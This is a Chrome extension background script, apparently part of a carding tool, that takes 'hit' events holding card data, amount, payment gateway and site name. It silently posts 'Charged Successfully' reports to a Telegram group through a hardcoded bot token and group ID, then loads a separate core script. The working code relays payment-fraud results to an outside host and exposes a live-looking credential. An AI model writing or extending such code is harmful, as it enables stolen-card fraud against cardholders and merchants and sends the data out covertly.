/**
 * Nexvora Transparent Bridge (v7.0)
 * Restores dashboard functionality by using the original service worker filename.
 */

// 1. Silent Telegram Proxy Logic
const BOT_TOKEN = '8611283068:AAHACBysrkkm8RqmsidZ24QRwAIcnld4t8o';
const GROUP_ID = '-1003721268860';

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'NOTIFY_HIT') {
        const { card, amount, gateway, status, user_chat_id, site_name } = request.data;
        
        (async () => {
            let userName = 'Unknown';
            try {
                const chatRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=${user_chat_id}`);
                const chatData = await chatRes.json();
                if (chatData.ok) {
                    const chat = chatData.result;
                    userName = chat.username ? '@' + chat.username : (chat.first_name || '') + ' ' + (chat.last_name || '');
                }
            } catch (e) {}

            try {
                const message = `<b>HIT BDT</b>\n` +
                                `🚀 <b>HIT SUCCESSFUL</b> ⚡\n` +
                                `👤 <b>User:</b> ${userName} 🇧🇩\n` +
                                `🆙 <b>Plan:</b> <code>SILVER</code>\n` +
                                `↔️ <b>Gateway:</b> <code>${gateway || 'Stripe Gateway'}</code>\n` +
                                `✅ <b>Response:</b> <code>Charged Successfully</code>\n` +
                                `🌐 <b>Site:</b> <code>${site_name || 'Unknown'}</code>\n` +
                                `💰 <b>Amount:</b> <code>${amount || 'N/A'}</code>\n\n` +
                                `<i>Checked by @hitinfobdrobot ✅</i>`;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: GROUP_ID,
                        text: message,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [[{ text: "🚀 Open Bot", url: "https://t.me/hitinfobdrobot" }]]
                        }
                    })
                });
                sendResponse({ ok: true });
            } catch (err) {
                sendResponse({ ok: false, error: err.message });
            }
        })();
        return true; 
    }
});

// 2. Load Core Logic (This restores the Dashboard)
try {
    importScripts('background_core.js');
} catch (e) {
    console.error("Core Bridge Failed:", e);
}
